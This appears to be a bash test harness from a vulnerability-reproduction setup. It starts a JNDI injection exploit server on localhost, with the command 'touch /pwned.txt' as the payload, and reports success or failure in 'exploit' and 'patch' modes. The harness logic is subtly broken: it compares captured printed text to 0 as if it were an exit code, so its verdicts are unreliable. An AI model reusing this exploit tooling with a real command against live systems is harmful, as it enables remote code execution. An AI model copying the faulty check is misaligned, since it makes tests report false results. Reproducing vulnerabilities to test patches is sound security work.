#!/usr/bin/env bash

set -eo pipefail

function help() {
    printf -- "Usage: %s [ exploit | patch ]\n\n" "$0"
}

function start_helpers() {
    printf "Starting helpers ..."
    java -jar src/test/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /pwned.txt" -A "127.0.0.1" &
    return $?
}

function run_exploit() {
    return 0
}

function validate_exploit_success() {
    if [ -f "/pwned.txt" ]; then
        printf "File exists"
        exit 0
    else
        printf "File does not exist"
        exit 1
    fi
}

# Main command
if [ "$1" != "exploit" ] && [ "$1" != "patch" ]; then
    help
    exit 1
else
    cmd=$1
    shift
fi

rc=$(start_helpers)
rc=$(run_exploit)
rc=$(validate_exploit_success)

# Return 0 if the exploit worked, 1 otherwise
if [ "$cmd" = "exploit" ]; then
    if [[ $rc == 0 ]]; then
        printf "Exploit worked"
        exit 0
    else
        printf "Exploit failed"
        exit 1
    fi

# Return 1 if the exploit worked, 0 otherwise
elif [ "$cmd" = "patch" ]; then
    if [[ $rc == 0 ]]; then
        printf "Exploit worked"
        exit 1
    else
        printf "Exploit failed"
        exit 0
    fi
fi